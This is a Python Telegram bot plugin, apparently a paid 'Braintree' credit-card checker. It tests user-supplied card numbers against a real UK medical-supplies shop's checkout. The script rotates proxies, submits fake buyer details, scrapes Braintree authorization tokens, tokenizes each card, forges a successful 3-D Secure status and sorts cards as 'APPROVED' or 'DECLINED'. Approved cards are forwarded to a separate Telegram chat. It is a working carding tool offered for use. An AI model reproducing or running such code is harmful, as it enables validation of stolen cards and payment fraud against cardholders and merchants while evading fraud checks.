import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
from parse import parseX
import check_template
import names
import re
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/ShopTASv/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "Braintree"
subtype = "$6,40"
command = "bra"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def braintree2(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/ShopTASv">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/ShopTASv">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/ShopTASv">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/ShopTASv">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @RushZ1 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    


    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/ShopTASv">✯</a>] 𝑨𝒍𝒚𝒂𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/ShopTASv">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/ShopTASv">✯</a>] 𝑨𝒍𝒚𝒂𝑪𝒉𝒌
[<a href="https://t.me/ShopTASv">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/ShopTASv">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/ShopTASv">✯</a>] Bot by ↯ @RushZ1

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/ShopTASv">✯</a>] 𝑨𝒍𝒚𝒂𝑪𝒉𝒌
[<a href="https://t.me/ShopTASv">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#

    url = "https://www.medicalsupplies.co.uk/alexandra-workwear-hygienic-overshoes.html"
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    }

    
    for retry in range(max_retries):
        try:
            response = session.get(url, headers=headers)
            
            csrf_match = re.search(r'csrf_token" value="([^"]+)"', response.text)
            csrf_token = csrf_match.group(1)
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #1"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()  
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #1"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #1"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- #2 Requests -------------------#
    
    url = "https://www.medicalsupplies.co.uk/alexandra-workwear-hygienic-overshoes.html"
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    }

    data = {
    "quantity": "1",
    "action": "add",
    "pid": "9328",
    "sku": "NU208",
    "frequency": "",
    "csrf_token": csrf_token,
    "addajax": "1",
    }

    

    for retry in range(max_retries):
        try:
            
            res1 = session.post(url, headers=headers, data=data,)
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #2"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #2"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #2"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #3 Requests -------------------#   
    
    url = "https://www.medicalsupplies.co.uk/checkout.html"

    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    }

    data = {
    "email": CorreoRand,
    "title": "0",
    "firstname": "mario",
    "lastname": "ops",
    "companyname": "",
    "address1": "Flat 1",
    "address2": "29-31 High Street",
    "towncity": "Cardiff",
    "county": "Caerdydd",
    "postcode": "CF10 1PU",
    "country": "GB",
    "GG": "0",
    "IE": "1",
    "IM": "1",
    "JE": "0",
    "GB": "0",
    "telephone": "02920224817",
    "vatnum": "",
    "eori": "",
    "reference": "",
    "alt_title": "0",
    "alt_firstname": "",
    "alt_lastname": "",
    "alt_companyname": "",
    "alt_address1": "",
    "alt_address2": "",
    "alt_towncity": "",
    "alt_county": "",
    "alt_postcode": "",
    "alt_country": "GB",
    "delivery": "1",
    "personal_information": "x",
    "noaccount": "x",
    "nosubmit": "0",
    "remove": "0",
    }

    
    for retry in range(max_retries):
        try:
            response = session.post(url, headers=headers, data=data,)
            tok_match = re.search(r'authorization: \'(.+?)\'', response.text)
            response_data = response.text
            tok = tok_match.group(1) if tok_match else None
            start_tag = '</div></div></div></form><form method="post" action="/checkout/action/return/?oid='
            end_tag = '" name='
            start_index = response_data.find(start_tag) +len(start_tag)
            end_index = response_data.find(end_tag, start_index)
            parsed_message = response_data[start_index:end_index]
            oid = parsed_message if parsed_message else None
            decoded_tok = base64.b64decode(tok).decode('utf-8')
            auth_match = json.loads(decoded_tok).get('authorizationFingerprint')
            auth = auth_match if auth_match else None
            break
           
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #3"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #3"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
        except KeyError as e:
            print(f"Error de clave: {e}")
            msg = "DECLINED ❌"
            respuesta = f"Error al obtener {e} del response | Requests #3"

            proxyy = "LIVE 🟩" 
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #3"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #4 Requests -------------------#
    
    url = "https://www.medicalsupplies.co.uk/checkout.html"

    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    }

    data = {
    "payment_method": "ccp",
    "payment_choice": "1",
    "payment_information": "choice",
    }

    
    for retry in range(max_retries):
        try:
            res2 = session.post(url, headers=headers, data=data,)
            break
        
            
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #4"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #4"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #4"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #5 Requests -------------------#
    
    url = "https://payments.braintree-api.com/graphql"


    headers = {
    "Host": "payments.braintree-api.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {auth}",
    "Braintree-Version": "2018-05-10",
    "Origin": "https://assets.braintreegateway.com",
    "Connection": "keep-alive",
    "Referer": "https://assets.braintreegateway.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Accept-Encoding": "gzip, deflate",
    }

    data = {
    "clientSdkMetadata": {
    "source": "client",
    "integration": "custom",
    "sessionId": "0d3c160c-1070-499d-95d0-f5fa9686d68b"
    },
    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) { token creditCard {   bin   brandCode   last4   cardholderName   expirationMonth  expirationYear  binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId   } }   } }",
    "variables": {
    "input": {
    "creditCard": {
    "number": ccnum,
    "expirationMonth": mes,
    "expirationYear": ano,
    "cvv": cvv
    },
    "options": {
    "validate": False
    }
    }
    },
    "operationName": "TokenizeCreditCard"
    }

    for retry in range(max_retries):
        try:

            response = session.post(url, headers=headers, json=data,)
            toke = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('token')
            brandCode = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('brandCode')
            Bin = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('bin')
            last4 = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('last4')

            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #5"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #5")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #5"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #5")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #5"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    
    #------------------- #6 Requests -------------------#
    
    url = f"https://api.braintreegateway.com/merchants/s797gcfwfvjxnwqb/client_api/v1/payment_methods/{toke}/three_d_secure/lookup"
    headers = {
    "Host": "api.braintreegateway.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Content-Length": "1521",
    "Origin": "https://www.medicalsupplies.co.uk",
    "Connection": "keep-alive",
    "Referer": "https://www.medicalsupplies.co.uk/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "TE": "trailers",
    }

    data = {
    "amount": 13.93,
    "additionalInfo": {
    "billingLine1": "Flat 1",
    "billingLine2": "29-31 High Street",
    "billingCity": "Cardiff",
    "billingState": "Caerdydd",
    "billingPostalCode": "CF10 1PU",
    "billingCountryCode": "GB",
    "billingPhoneNumber": "02920224817",
    "billingGivenName": "Mario",
    "billingSurname": "Ops",
    "email": CorreoRand
    },
    "bin": Bin,
    "dfReferenceId": "0_e75b1e79-6216-410f-912e-7e609e39ac0c",
    "clientMetadata": {
    "requestedThreeDSecureVersion": "2",
    "sdkVersion": "web/3.94.0",
    "cardinalDeviceDataCollectionTimeElapsed": 574,
    "issuerDeviceDataCollectionTimeElapsed": 3188,
    "issuerDeviceDataCollectionResult": True
    },
    "authorizationFingerprint": auth,
    "braintreeLibraryVersion": "braintree/web/3.94.0",
    "_meta": {
    "merchantAppId": "www.medicalsupplies.co.uk",
    "platform": "web",
    "sdkVersion": "3.94.0",
    "source": "client",
    "integration": "custom",
    "integrationType": "custom",
    "sessionId": "0d3c160c-1070-499d-95d0-f5fa9686d68b"
    }
    }

            
    for retry in range(max_retries):
        try:
            res6 = session.post(url, headers=headers, json=data,) 
            
            response_json = res6.json()
            nonce = response_json["paymentMethod"]["nonce"]
            cardType = response_json["paymentMethod"]["details"]["cardType"]
            last2 = response_json["paymentMethod"]["details"]["lastTwo"]
            prepaid = response_json["paymentMethod"]["binData"]["prepaid"]
            healthcare = response_json["paymentMethod"]["binData"]["healthcare"]
            debit = response_json["paymentMethod"]["binData"]["debit"]
            durbinRegulated = response_json["paymentMethod"]["binData"]["durbinRegulated"]
            commercial = response_json["paymentMethod"]["binData"]["commercial"]
            payroll = response_json["paymentMethod"]["binData"]["payroll"]
            issuingBank = response_json["paymentMethod"]["binData"]["issuingBank"]
            countryOfIssuance = response_json["paymentMethod"]["binData"]["countryOfIssuance"]
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #6"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #6")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #6"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #6")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #6"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    
    #------------------- #7 Requests -------------------#
    
    url = f"https://www.medicalsupplies.co.uk/checkout/action/return/?oid={oid}"
    headers = {
    "Host": "www.medicalsupplies.co.uk",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "324",
    "Origin": "https://www.medicalsupplies.co.uk",
    "Connection": "keep-alive",
    "Referer": "https://www.medicalsupplies.co.uk/checkout.html",
    "Cookie": "PHPSESSID=aaf799078cca3cf5e64a82be834118f0; BPSESSID=aaf799078cca3cf5e64a82be834118f0; _gcl_au=1.1.1716430907.1702827717; _ga_E6SZ919XYF=GS1.1.1702827716.1.1.1702828411.59.0.0; _ga=GA1.3.276158566.1702827717; _gid=GA1.3.1117692363.1702827718",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    }
    data = {
    "braintree_confirm": "1",
    "bt_nonce": nonce,
    "bt_device": 'device_session_id":"99208dfba519bcbd12cdbffc87d9b9af","fraud_merchant_id":null,"correlation_id":"4094d638b2086518a43e0f2873bd3185',
    "bt_3dstatus": "authenticate_attempt_successful",
    "bt_3derror": "",
    "bt_3dmessage": "",
    "bt_store": ""
    }
    
 
 
    for retry in range(max_retries):
        try:
            res7 = session.post(url, headers=headers, data=data)
            response_data = res7.text
            start_tag = '.</p><p><i>'
            end_tag = '.</i></p><p>'
            start_index = response_data.find(start_tag) +len(start_tag)
            end_index = response_data.find(end_tag, start_index)
            parsed_message = response_data[start_index:end_index]
            code = parsed_message if parsed_message else None

            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #7"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #7")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #7"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #7")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #7"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    #------------------- RESPONSE CODE ------------------------#
    
    if "Card Issuer Declined CVV" in code:
            msg = "APPROVED CCN✅"
            respuesta = "Card Issuer Declined CVV"
            
    elif "Insufficient Funds" in code:
            msg = "APPROVED CCV✅"
            respuesta = "Insufficient Funds"
            
    elif "Gateway Rejected: avs" in code:
            msg = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs"
            
    elif "Gateway Rejected: avs_and_cvv" in code:
            msg = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs_and_cvv"
            
    else:
            respuesta = code
            msg = "DECLINED ❌"
            
    
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
    if "APPROVED" in msg:
        chat_id = -4124951140
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
        return 
    
